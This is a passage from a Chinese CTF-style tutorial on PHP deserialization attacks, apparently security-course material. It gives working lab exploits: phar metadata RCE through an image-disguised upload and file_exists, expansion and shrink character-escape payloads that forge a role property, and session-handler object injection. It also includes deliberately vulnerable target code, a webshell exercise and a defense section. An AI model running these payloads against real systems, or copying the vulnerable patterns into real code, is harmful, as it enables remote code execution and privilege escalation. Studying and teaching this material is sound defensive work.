is_file: TRIGGER
is_link: TRIGGER
is_readable: TRIGGER
filesize: TRIGGER
filemtime: TRIGGER
fileperms: TRIGGER
file_get_contents: TRIGGER
file: TRIGGER
fopen: TRIGGER
readfile: TRIGGER
stat: TRIGGER
opendir: TRIGGER
scandir: TRIGGER
glob: no
md5_file: TRIGGER
hash_file: TRIGGER
getimagesize: TRIGGER
copy: TRIGGER
unlink: TRIGGER
touch: TRIGGER
```

输出（PHP 8.5）：

```
file_exists: no
is_dir: no
is_file: no
is_link: no
is_readable: no
filesize: no
filemtime: no
fileperms: no
file_get_contents: no
file: no
fopen: no
readfile: no
stat: no
opendir: no
scandir: no
glob: no
md5_file: no
hash_file: no
getimagesize: no
copy: no
unlink: no
touch: no
```

汇总成函数面表：

| 函数 | PHP 7.4 | PHP 8.5 |
| ---- | ---- | ---- |
| `file_exists` `is_dir` `is_file` `is_link` `is_readable` | 触发 | 不触发 |
| `filesize` `filemtime` `fileperms` `stat` | 触发 | 不触发 |
| `file_get_contents` `file` `fopen` `readfile` | 触发 | 不触发 |
| `opendir` `scandir` `copy` `unlink` `touch` | 触发 | 不触发 |
| `md5_file` `hash_file` `getimagesize` | 触发 | 不触发 |
| `glob` | 不触发 | 不触发 |

版本分界一句话：==PHP 8.0 起，流函数打开 phar 时不再自动反序列化元数据==（PHP 官方把这一定位为副作用并按 RFC "Don't automatically unserialize Phar metadata" 移除；`glob()` 本身不支持流封装路径，两列都不触发）。这张表的实战读法：==靶子的 PHP 版本决定 phar 打法是否存在==——7.x 及更早是这类攻击的主场，8.x 上同一 payload 静默失效（流照常打开、文件照常读到，唯独元数据不再反序列化）。判断靶子版本的常规手段在 [[W03-信息泄露与前端安全|W03]]（phpinfo、报错指纹）。

### 5.3 图片马 + 任意文件操作函数：完整打靶

靶子的功能代码里一个 phar 相关的字样都没有——一个"文件存在性检查"、一个只看扩展名与 Content-Type 的上传口，外加一个与功能无关、恰好躺在代码库里的 `Cleaner` 类：

```php
<?php
// pharlab.php —— "文件存在性检查"功能：路径来自用户输入（代码里没有任何 phar 相关逻辑）
class Cleaner {                       // 与本功能无关的类，恰好躺在代码库里
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}
$f = $_GET['f'] ?? '';
echo file_exists($f) ? "exists\n" : "missing\n";
```

```php
<?php
// upload.php —— 演示用上传口：只认图片扩展名与图片 Content-Type，不看内容
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['f']['name'] ?? '', PATHINFO_EXTENSION));
$type = $_FILES['f']['type'] ?? '';
if (!in_array($ext, $allowed) || strncmp($type, 'image/', 6) !== 0) {
    http_response_code(400);
    exit("bad file\n");
}
move_uploaded_file($_FILES['f']['tmp_name'], 'uploads/' . $_FILES['f']['name']);
echo "saved uploads/{$_FILES['f']['name']}\n";
```

在 PHP 7.4 容器里起靶（9201 映射到容器的 9200）：

```bash
docker run -d --name w12phar -p 127.0.0.1:9201:9200 \
    -v "$PWD":/lab -w /lab php:7.4-cli php -S 0.0.0.0:9200 -d display_errors=1
```

三步打穿。上传图片马——5.1 构造的 evil.jpg 扩展名、Content-Type、文件头（`GIF89a`）三关全过：

```bash
curl -s --noproxy '*' -F 'f=@evil.jpg;type=image/jpeg' 'http://127.0.0.1:9201/upload.php'
curl -s --noproxy '*' 'http://127.0.0.1:9201/check_img.php'
```

输出：

```
saved uploads/evil.jpg
```

```
array(6) {
  [0]=>
  int(16188)
  [1]=>
  int(26736)
  [2]=>
  int(1)
  [3]=>
  string(28) "width="16188" height="26736""
  ["channels"]=>
  int(3)
  ["mime"]=>
  string(9) "image/gif"
}
```

`getimagesize` 认它是 GIF（尺寸字段是垃圾值，不影响通过）。再打"文件存在性检查"，路径里唯一特别的东西是 `phar://` 前缀：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9201/pharlab.php' \
  --data-urlencode 'f=phar://uploads/evil.jpg'
```

输出：

```
exists
flag{ph4r_m4t4d4t4_rce}
```

执行顺序：`file_exists` 打开 phar 流 → manifest 元数据被反序列化 → `Cleaner` 对象恢复（`cmd` 来自元数据）→ 响应输出 `exists` → 请求结束时对象销毁 → `__destruct` 执行 `cat flag.txt`，flag 跟在后面。==整条利用链里，靶子的功能代码只提供了一个带用户输入路径的 `file_exists`，一个 `phar` 字样都没有==——这就是 phar 反序列化在 CTF 里危险的地方：[[W03-信息泄露与前端安全|W03]] 找上传点、[[W06-文件包含|W06]] 之外的任何文件操作函数，都可能成为入口。

### 5.4 同一段代码在 PHP 8.5 上：对照与当代入口

同一个 `pharlab.php` 的逻辑放到 8.5 上（CLI 版，便于对照）：

```bash
php pharlab_cli.php 'phar:///…路径…/uploads/evil.jpg'
docker run --rm -v "$PWD":/lab -w /lab php:7.4-cli php /lab/pharlab_cli.php 'phar:///lab/uploads/evil.jpg'
```

输出（PHP 8.5）：

```
exists
```

输出（PHP 7.4）：

```
exists
flag{ph4r_m4t4d4t4_rce}
```

8.5 上 `file_exists` 照常返回 `true`（流能打开、归档能解析），唯独没有 flag——==元数据反序列化这一步被移除，其余行为分毫不差==。按 5.2 的函数面表，8.x 靶上 phar 打法整体失效，不要再往这个方向花时间。

8.x 上元数据仍有一条显式入口：`Phar::getMetadata()`。它按调用方的选项反序列化元数据，类恢复后照常走魔术方法：

```php
<?php
// debug3.php —— 当代入口：Phar::getMetadata() 在 8.5 上如何反序列化元数据
class Probe {
    public $x;
    function __construct() { echo "[constructed]\n"; }
    function __wakeup()    { echo "[wakeup]\n"; }
    function __destruct()  { echo "[destruct]\n"; }
}
echo "== getMetadata() 无参数 ==\n";
$p = new Phar(__DIR__ . '/probe.phar');
$m = $p->getMetadata();
var_dump(is_object($m) ? get_class($m) : $m);
```

```bash
php -d phar.readonly=0 build_probe.php
php debug3.php
```

输出：

```
== getMetadata() 无参数 ==
[wakeup]
string(5) "Probe"
```

`__construct` 没出现（unserialize 语义，第 2 节图谱），`__wakeup` 触发，对象完整恢复——应用代码里若有"读用户上传归档的元数据"功能（相册、插件包预览），这条入口在 8.x 上仍然成立。`getMetadata()` 也接受与 `unserialize()` 相同的 `allowed_classes` 选项（第 7 节）。

> [!info]- 元数据在归档级，不在包内文件级
> phar 的元数据有两层：归档自身的（`$p->setMetadata()`，本章用的）和包内单个文件的（`$p['a.txt']->setMetadata()`）。两层都会被（7.x 的）自动反序列化覆盖，构造时写归档级最省事。另外 [[W06-文件包含#4.7 zip:// 与 phar://：包内条目也是文件|W06 4.7]] 的 include 语境与本节是同一协议的两个利用面：include 走的是"包内文件当 PHP 执行"，本节是"打开归档顺带反序列化元数据"——前者要文件内容可控，后者只要归档元数据可控，门槛更低。

## 6. 字符逃逸：借长度差改写属性

### 6.1 原理：过滤器改动了字节账

先复述 1.1 节的地基：unserialize 是长度驱动的，`s:L:"…" 的边界由 L 决定。serialize 产出的串里，每个 L 都与内容严格一致。==一旦 serialize 之后、unserialize 之前，有过滤器对整串做了替换，替换增减的字节就让"声明的 L"与"实际内容"对不上了==——多出来的字节被解析器当成后续语法读（膨胀型），少了的字节让解析器越过边界多读（收缩型）。两种都能把攻击者准备好的串"顶"进语法流，改写后面的属性。

漏洞代码的形状固定为三步顺序：

```php
$s = serialize($obj);     // ① 长度声明与内容一致
$s = filter($s);          // ② 过滤器替换，字节账被打破
$obj2 = unserialize($s);  // ③ 按旧账本解析
```

==过滤器若是发生在 serialize 之前，长度声明与内容一致，无洞==；洞就在"先 serialize、后过滤、再 unserialize"的顺序里。这类过滤器在真实应用里的出身是"防注入的字符替换"——把单引号替换成转义形式是最常见的一种。

### 6.2 膨胀型：多出的字节顶开边界

靶子把用户可控的 `user` 属性值经过"单引号替换为转义形式"的过滤后再反序列化：

```php
<?php
// escape.php —— 字符逃逸靶（膨胀型）：过滤把单引号替换成转义形式，之后才反序列化
class User {
    public $user = 'guest';
    public $role = 'member';
}
function filter($s) {
    return str_replace("'", "\\'", $s);      // 每个单引号净增 1 字节
}
$u = new User();
$u->user = $_GET['u'] ?? 'guest';
$ser = filter(serialize($u));
echo "[after filter] $ser\n";
$obj = unserialize($ser);
echo "[role] ";
var_dump($obj->role);
if ($obj->role === 'admin') {
    echo "flag{esc4p3_by_l3ngth}\n";
}
```

先看正常输入的完整串：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9203/escape.php' --data-urlencode 'u=guest'
```

输出：

```
[after filter] O:4:"User":2:{s:4:"user";s:5:"guest";s:4:"role";s:6:"member";}
[role] string(6) "member"
```

==字符串内容不转义==（1.1 节），所以攻击者可以把**序列化语法本身**写进 `user` 的值里；唯一的问题是这些字符会被算进 `s:L` 的长度、当作字符串内容读掉。过滤器的替换给了改写的机会：每个单引号在过滤后变成 `\'`，==净增 1 字节==。净增的字节落在值区末尾之外，解析器按声明的 L 读完后，会把这些"多出来"的字节当成后续语法继续读。

构造算式：

1. 注入段准备好：`"` + 完整伪造属性 + `}`，本靶为 `";s:4:"role";s:5:"admin";}`——闭合引号接伪造的 `role` 属性，`}` 提前收口整个对象，总长 26 字节；
2. ==让净增字节数恰好等于注入段长度==：`user` 值开头放 **26 个单引号**，后面跟注入段。声明长度 L = 26 + 26 = 52；过滤后值区实际 78 字节；解析器读满 52 字节（26 组 `\'`）后，第 53 字节恰是注入段开头的 `"`，被当作 user 字符串的闭合引号，其后 `;s:4:"role";s:5:"admin";}` 按语法解析成第二个属性，`}` 收口对象；原文里真正的 `";s:4:"role";s:6:"member";}` 变成收口后的多余字节。

payload 文件与打靶（用 PHP 生成，免得手数 26 个引号）：

```php
<?php
// gen_escape.php —— 生成两套逃逸 payload 文件（不带换行）
$big = str_repeat("'", 26) . '";s:4:"role";s:5:"admin";}';
file_put_contents(__DIR__ . '/pl_big.txt', $big);
printf("big: len=%d quotes=%d\n", strlen($big), substr_count($big, "'"));
```

```bash
php gen_escape.php
curl -s --noproxy '*' -G 'http://127.0.0.1:9203/escape.php' --data-urlencode "u@pl_big.txt"
```

输出：

```
big: len=52 quotes=26
```

```
[after filter] O:4:"User":2:{s:4:"user";s:52:"\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'";s:4:"role";s:5:"admin";}";s:4:"role";s:6:"member";}
<br />
<b>Warning</b>:  unserialize(): Extra data starting at offset 109 of 136 bytes in <b>.../escape.php</b> on line <b>14</b><br />
[role] string(5) "admin"
flag{esc4p3_by_l3ngth}
```

逐段核对 `[after filter]` 行：user 值区是 26 组 `\'`（52 字节），声明的 `s:52` 读完后紧跟的正是注入段 `";s:4:"role";s:5:"admin";}`——伪造属性顶掉了真的；原文收尾 `";s:4:"role";s:6:"member";}` 成为多余字节，触发一条 `Extra data` 告警（多余字节只发告警、==不影响返回值==，这就是注入段用 `}` 提前收口能成立的原因）。`role` 变成 `admin`，flag 到手。

### 6.3 收缩型：少了的字节靠越界补齐

过滤器反向时构造也反向。靶子把 `\'` 还原成 `'`——每处净减 1 字节；类有三个属性，`user`、`note` 都可控，目标仍是改 `role`：

```php
<?php
// escape_shrink.php —— 字符逃逸靶（收缩型）：过滤把转义形式还原成单引号，之后才反序列化
class User {
    public $user  = 'guest';
    public $note  = 'nothing';
    public $role  = 'member';
}
function filter($s) {
    return str_replace("\\'", "'", $s);      // 每处 \' 净减 1 字节
}
$u = new User();
$u->user = $_GET['u'] ?? 'guest';
$u->note = $_GET['n'] ?? 'nothing';
$ser = filter(serialize($u));
echo "[after filter] $ser\n";
$obj = unserialize($ser);
echo "[role] ";
var_dump($obj->role);
if ($obj->role === 'admin') {
    echo "flag{shr1nk_esc4p3}\n";
}
```

收缩型的字节账：user 值区过滤后变短，==解析器按声明的 L 读会越过值区边界，把边界之后的若干字节吞进字符串==。被吞的字节是固定的一串——user 的收尾 `";` 加下一个属性名的完整序列化加其值声明头。要利用，就得让吞到的位置恰好停在下一个**可控值**的声明引号上，然后由那个可控值的开头提供伪造语法：

构造算式（`user` 放 m 处 `\'`，每处净减 1，共少 m 字节）：

1. user 的序列化形态是每处 `\'`（3 字节：serialize 会把反斜杠原样保留，值区即 `\'\'…`），过滤后成 `'`（1 字节）；声明 L = 3m，过滤后值区 2m……更正：声明 L 按 serialize 时的字节算，`\'` 两个字符就是 2 字节，L = 2m，过滤后 m。**被吞字节数 = m**；
2. 让 m 恰好等于"user 收尾 + note 属性名序列化 + note 值声明头"的长度，即 m = 2 + `len("s:4:\"note\";")` + `len("s:NN:")`。note 值取 64 字节（两位数），m = 2 + 11 + 5 = 18；
3. `user` 放 **18 处 `\'`**；`note` 的值以 `;` 开头接伪造属性链 `;s:4:"role";s:5:"admin";s:4:"note";s:1:"x";}` 再补足到 64 字节——解析器把 note 值开头的引号当 user 的收尾引号，把 note 内容当真语法读：`role` 被改写、`note` 被伪装属性复位成 `x`，三个属性凑齐声明个数后 `}` 收口。

```php
<?php
// gen_escape.php（收缩段）——
$shrink_u = str_repeat("\\'", 18);
$shrink_n = ';s:4:"role";s:5:"admin";s:4:"note";s:1:"x";}' . str_repeat('A', 20);
file_put_contents(__DIR__ . '/pl_shrink_u.txt', $shrink_u);
file_put_contents(__DIR__ . '/pl_shrink_n.txt', $shrink_n);
printf("shrink_u: len=%d pairs=%d\n", strlen($shrink_u), substr_count($shrink_u, "\\'"));
printf("shrink_n: len=%d\n", strlen($shrink_n));
```

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9203/escape_shrink.php' \
  --data-urlencode "u@pl_shrink_u.txt" --data-urlencode "n@pl_shrink_n.txt"
```

输出：

```
[after filter] O:4:"User":3:{s:4:"user";s:36:"''''''''''''''''''";s:4:"note";s:64:";s:4:"role";s:5:"admin";s:4:"note";s:1:"x";}AAAAAAAAAAAAAAAAAAAA";s:4:"role";s:6:"member";}
<br />
<b>Warning</b>:  unserialize(): Extra data starting at offset 112 of 159 bytes in <b>.../escape_shrink.php</b> on line <b>16</b><br />
[role] string(5) "admin"
flag{shr1nk_esc4p3}
```

`[after filter]` 行就是构造过程的成品展示：user 值区过滤后只剩 18 个引号，解析器读满声明的 36 字节，把 `";s:4:"note";s:64:"` 连收尾带声明头整个吞进字符串，从 note 值的第一字节起按语法流解析——`;s:4:"role"` 成了第二个属性，`;s:4:"note";s:1:"x"` 补足第三个，`}` 收口，原文全部成为垃圾尾巴。

> [!warning] 两型通用的三条自查
> ① 每处替换净增/净减几字节、出现几次，先算总账再拼串，差一个字节解析就错位；② 注入段里的长度（`s:5:"admin"` 的 5、`s:64:` 的 64）都要与实际字节一致，改了属性值记得同步改长度；③ 过滤器必须作用在==序列化之后的完整串==上——把替换写在 serialize 之前的靶子没有这个洞。算式总结：==膨胀型令"净增总量 = 注入段长度"，收缩型令"净减总量 = 被吞边界长度"，都用出现次数凑数==。

## 7. 其他入口：白名单、session 与 SoapClient

### 7.1 allowed_classes：unserialize 的白名单参数

`unserialize()` 的第二参数收一个选项数组，`allowed_classes` 键限定哪些类允许恢复：

```php
<?php
// allowed.php —— unserialize 的 allowed_classes 白名单参数
$safe = 'O:4:"Safe":1:{s:1:"x";i:9;}';
class Safe { public $x = 1; function __destruct(){ echo "[Safe::__destruct]\n"; } }
class Other { }

echo "-- 不传 options：全部类可用 --\n";
var_dump(unserialize($safe));

echo "-- options 传了数组但没写 allowed_classes：仍是全部类可用 --\n";
var_dump(unserialize($safe, []));

echo "-- allowed_classes = false：全部降级为 __PHP_Incomplete_Class --\n";
var_dump(unserialize($safe, ['allowed_classes' => false]));

echo "-- allowed_classes = ['Other']：白名单外的类同样降级 --\n";
var_dump(unserialize($safe, ['allowed_classes' => ['Other']]));

echo "-- allowed_classes = ['Safe']：白名单内正常恢复 --\n";
var_dump(unserialize($safe, ['allowed_classes' => ['Safe']]));
```

```bash
php allowed.php
```

输出：

```
-- 不传 options：全部类可用 --
object(Safe)#1 (1) {
  ["x"]=>
  int(9)
}
[Safe::__destruct]
-- options 传了数组但没写 allowed_classes：仍是全部类可用 --
object(Safe)#1 (1) {
  ["x"]=>
  int(9)
}
[Safe::__destruct]
-- allowed_classes = false：全部降级为 __PHP_Incomplete_Class -- 
object(__PHP_Incomplete_Class)#1 (2) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(4) "Safe"
  ["x"]=>
  int(9)
}
-- allowed_classes = ['Other']：白名单外的类同样降级 --
object(__PHP_Incomplete_Class)#1 (2) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(4) "Safe"
  ["x"]=>
  int(9)
}
-- allowed_classes = ['Safe']：白名单内正常恢复 --
object(Safe)#1 (1) {
  ["x"]=>
  int(9)
}
[Safe::__destruct]
```

三条结论：==默认（不传 options 或 options 里省略该键）全部类可用==；显式 `false` 或白名单外的类会把对象降级为 `__PHP_Incomplete_Class`——属性数据还在，但方法不可调、==魔术方法（含 `__destruct`）一个不触发==；白名单内的类照常恢复。对攻击者的含义：见到带白名单的靶，链里的类必须全部落在名单内，第 3 节选跳板时先把名单抄下来。对防御者的写法见第 8 节。

### 7.2 session 处理器差异：php 与 php_serialize

[[W01-Web安全导论与HTTP深化|W01]]讲过 session 数据存服务端；[[W06-文件包含|W06]] 6.1 见过它在磁盘上的形态。落盘格式由 `session.serialize_handler` 决定，两个常用处理器的格式不同：

| 处理器 | 落盘格式 | 特点 |
| ---- | ---- | ---- |
| `php`（默认） | `键名\|值序列化;键名2\|…` | 键名不参与序列化，按 `\|` 切分 |
| `php_serialize` | 整个 `$_SESSION` 一次 `serialize()` | 与 unserialize 同一格式，键名安全 |

==写读两端用了不同处理器时，`|` 就成了注入位==：写端按 php_serialize 存（键名再怪也只是串），读端按 php 处理器解析时按第一个 `|` 切分——键名里的 `|` 之后的内容被当成"值的序列化串"交给 unserialize。写端脚本：

```php
<?php
// sess_write.php —— 写端：php_serialize 处理器（整表序列化，格式安全）
// 用法: php sess_write.php '<键名>'
ini_set('session.serialize_handler', 'php_serialize');
ini_set('session.save_path', '/tmp/w12sess');
session_id('w12inj01');
session_start();
$_SESSION[$argv[1]] = 'guest';
session_write_close();
echo "written\n";
```

读端用默认的 php 处理器，并定义一个等待恢复的类：

```php
<?php
// sess_read.php —— 读端：php 处理器（按 | 切分键与值）
ini_set('session.serialize_handler', 'php');
ini_set('session.save_path', '/tmp/w12sess');
class Pwn {
    public $cmd = 'id';
    function __wakeup() {
        echo "[__wakeup] injected object restored, cmd={$this->cmd}\n";
    }
}
session_id('w12inj01');
session_start();
echo "keys: ";
var_dump(array_keys($_SESSION));
```

键名里带一个完整的对象序列化串（注意串里有 `|`）：

```bash
php sess_write.php 'a|O:3:"Pwn":1:{s:3:"cmd";s:2:"id";}'
cat /tmp/w12sess/sess_w12inj01
php sess_read.php
```

输出：

```
written
```

```
a:1:{s:35:"a|O:3:"Pwn":1:{s:3:"cmd";s:2:"id";}";s:5:"guest";}
```

```
[__wakeup] injected object restored, cmd=id
PHP Warning:  session_start(): Failed to decode session object. Session has been destroyed in .../sess_read.php on line 13
keys: array(0) {
}
```

读盘内容是写端的整表序列化（`s:35` 的键里嵌着注入串）；php 处理器读到第一个 `|` 就把 `O:3:"Pwn":1:{…}` 当值反序列化——`__wakeup` 先触发（对象恢复了），随后解析错乱、session 被弃置。==利用成立的条件只有一条：写读两端处理器不同==。靶场判断法同 [[W06-文件包含|W06]] 6.1：session 文件首字符是 `a:` 是 php_serialize，直接是 `键|值` 形态是 php。

### 7.3 SoapClient：__call 打 SSRF 的一句原理

> [!info]- SoapClient 与 __call
> soap 扩展提供的 `SoapClient` 类定义了 `__call`：调用任何它不认识的方法名，都会向构造时指定的 `$options['location']` 发一个 SOAP/HTTP 请求。把它放进 POP 链（`unserialize` 恢复一个 SoapClient，属性 `location`、`uri`、`user_agent` 全部来自串里），任何一跳"调用不存在方法"的操作都会变成一次==攻击者定义了 URL 与请求头的 HTTP 请求==——即一次 SSRF（概念见 [[W10-SSRF|W10]]）；配合 `user_agent` 里带输出（`%s` 占位）还能外带数据。前提是靶机装了 soap 扩展（`php -m` 里看得到 `soap`），未启用的环境上没有这个类，链走不通；遇到装了 soap 的靶，这一手是 `__call` 跳板的标准用法。

## 8. 防御

按攻击面从根到枝排：

1. **不对用户输入调用 unserialize**。需要跨请求传结构化数据就用 JSON（`json_encode`/`json_decode` 没有对象恢复语义，不存在魔术方法问题）。这是唯一能==从根上取消攻击面==的一条，与 [[W05-命令注入与代码执行|W05]] "能不进 shell 就不进"、[[W06-文件包含|W06]] 白名单映射同一思想；
2. **无法避免时，白名单加签名**。`unserialize($data, ['allowed_classes' => [……]])` 显式列类（记住 7.1 的结论：省略键等于全放行）；数据外层加 `hash_hmac` 签名，密钥只在服务端，篡改即拒——签名防篡改、白名单防类滥用，各管一半；
3. **phar 面**。PHP ≥ 8.0 已移除流函数的自动元数据反序列化（5.2 的版本分界），升级是根治；维护 7.x 的系统则：文件操作函数不收用户输入路径，或入口处拒绝带 `phar://` 前缀的路径（`stripos($path, 'phar://') === 0` 类检查），上传目录与校验逻辑同查；
4. **session 面**。全站统一 `session.serialize_handler`（写读同处理器，7.2 的注入即失效）；用户可控值进 session 前不要保留原始串形态（[[W06-文件包含|W06]] 6.1 的包含路线同样受益）；
5. **报错收敛**。生产环境关 `display_errors`——本章各靶的 payload 诊断大量依赖 Warning 回显（`Error at offset`、`Extra data` 的偏移量），关掉它探测成本显著上升。

## 9. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| `unserialize()` 返回 `false` | 看 Warning 里的 `Error at offset N`：N 附近就是坏点。多数是长度/个数声明与内容不符——每个 `s:`、`i:` 用 `strlen` 核对，中文按字节算（[[#1.1 类型码与长度声明\|1.1]]） |
| payload 打 protected 属性赋不上值 | 属性名前的 `\0*\0` 三个 NUL 丢了（手敲丢字节、传输被解码吃掉）：用 PHP 生成串并整体 `rawurlencode`（[[#1.2 可见性前缀：\\0*\\0 与 \\0类名\\0\|1.2]]） |
| cookie 里的 payload 到了服务端缺胳膊少腿 | 未编码的 `;`、`&`、空格在报文里被截断：`rawurlencode` 全量编码后再放 cookie（[[#1.3 进 cookie 的形态\|1.3]]） |
| `echo $obj` 报 could not be converted to string | 类没有 `__toString`，链断在这一跳：回源码找带 `__toString` 的类或换入口（[[#2. 魔术方法触发图谱\|第 2 节]]） |
| unserialize 后什么都没发生 | 类未定义时对象降级为 `__PHP_Incomplete_Class`，魔术方法全不触发：==链里的每个类都必须在靶子代码里已定义==（[[#3.1 原理：面向属性编程\|3.1]]） |
| phar payload 打 8.x 靶静默无效 | PHP ≥ 8.0 已移除流函数的自动元数据反序列化，函数面全空：换路线，别恋战（[[#5.2 触发机制与版本分界\|5.2]]） |
| 创建 phar 报 `disabled by the php.ini setting phar.readonly` | 创建需 `-d phar.readonly=0`；读取不受该开关影响（[[#5.1 phar 文件的三段结构\|5.1]]） |
| `new Phar('evil.jpg')` 报 extension not recognised | 构造器只认 `.phar`/`.zip`/`.tar` 一族扩展名：先建 `.phar` 再改名（[[#5.1 phar 文件的三段结构\|5.1]]） |
| 逃逸 payload 打完 `role` 没变 | 账没算平：净增/净减总量与注入段/被吞边界长度差字节；或过滤器写在 serialize 之前（无洞）。重核算式（[[#6.2 膨胀型：多出的字节顶开边界\|6.2]]、[[#6.3 收缩型：少了的字节靠越界补齐\|6.3]]） |
| `unserialize(): Extra data starting at offset` | 完整值之后还有多余字节——逃逸 payload 的正常现象，返回值不受影响；意外出现则说明串被截断或拼接（[[#6.2 膨胀型：多出的字节顶开边界\|6.2]]） |
| 传了 `['allowed_classes' => ……]` 怎么还全放行 | options 数组里没写 `allowed_classes` 键时等于没限制：要拒绝必须显式 `false` 或列白名单（[[#7.1 allowed_classes：unserialize 的白名单参数\|7.1]]） |
| session 注入不生效 | 写读两端处理器相同则无注入位；或 `save_path`、session id 两端不一致（[[#7.2 session 处理器差异：php 与 php_serialize\|7.2]]） |
| 改大属性数绕 `__wakeup` 不生效 | 该绕过只活在 PHP < 5.6.25 / < 7.0.10；当代靶上这种串直接反序列化失败（[[#4. __wakeup 绕过：一段版本史\|第 4 节]]） |

## 10. 配套练习与延伸阅读

> [!note] 实战任务
> 1. **CTFshow Web 入门**的反序列化分区（[[01-练习平台索引|01 章]]收录获取方式）：每题先按第 3.1 节的固定三步走"找终点 → 找跳板 → 接源头"，把源码里的类全部抄下来再动手。
> 2. **BUUCTF Web 区**挑三道标注 PHP 反序列化的题（[[01-练习平台索引|01 章]]）：至少一道跑通"序列化串在 cookie 里"的完整手工构造，至少一道用到第 5 节或第 6 节的路线。

配套练习：

1. 把 3.2 的 `Logger::__destruct` 改成写文件（`file_put_contents('shell.php', $this->code)`），三条链全部重打，对比"执行命令"与"落地 webshell"两种终点在响应里的差别，说明哪一种在无回显靶上更常用。
2. 把 escape.php 的过滤改成 `str_replace('ab', 'xyza', $s)`（每处净增 2 字节），按 6.2 的算式重算注入段与出现次数，生成 payload 打靶验证；再想一次"如果注入段长度是奇数"该怎么凑。
3. 给 5.2 的 `Probe` 类加上 `__wakeup`（打印一行标记），只在 7.4 容器里重跑 `trigger_loop.sh`，对照 `__wakeup`（流打开即触发）与 `__destruct`（进程结束才触发）的时间差，写一句这个时间差对"判断触发是否发生"的影响。
4. 把 7.2 读端的 `session.serialize_handler` 改回 `php_serialize` 重打同样的键名，确认注入失效，并用两种落盘格式的差异解释原因。
5. 在装有 soap 扩展的环境（`apt-get install php-soap` 一类）复现 7.3 折叠框的 SoapClient 链：构造 `location` 指向本机 nc 监听端口的 payload，在监听端收下这次 HTTP 请求。

延伸阅读：

- PHP 手册 `unserialize` 页：`$options` 的全部键与各版本行为注释，7.1 的原始出处；`Phar` 与 `Phar::getMetadata()` 页：元数据与选项语义；
- PHP 内部实现书（phpinternalsbook.com）的序列化格式一章：各类型码与 `S` 变体的编码细节，第 1 节格式表的权威版本；
- PHP RFC "Don't automatically unserialize Phar metadata"（wiki.php.net/rfc/phar_stop_autoloading_metadata）：5.2 版本分界的原始出处与讨论；
- phpggc 仓库（GitHub `ambionics/phpggc`）：主流框架的现成 POP 链生成器，打框架靶前的必备工具，链结构可对照本章 3.1 的三步法阅读；
- PayloadsAllTheThings 仓库的 PHP Deserialization 篇：`__wakeup` 绕过、phar 函数面、字符逃逸的更多变体索引；
- 复盘对照：[[W05-命令注入与代码执行|W05]] 的执行函数族是链终点的常客，[[W06-文件包含|W06]] 的伪协议与包含路线是链中转的另一种形态——三章放在一起，就是"用户输入抵达危险函数"的完整路径图。
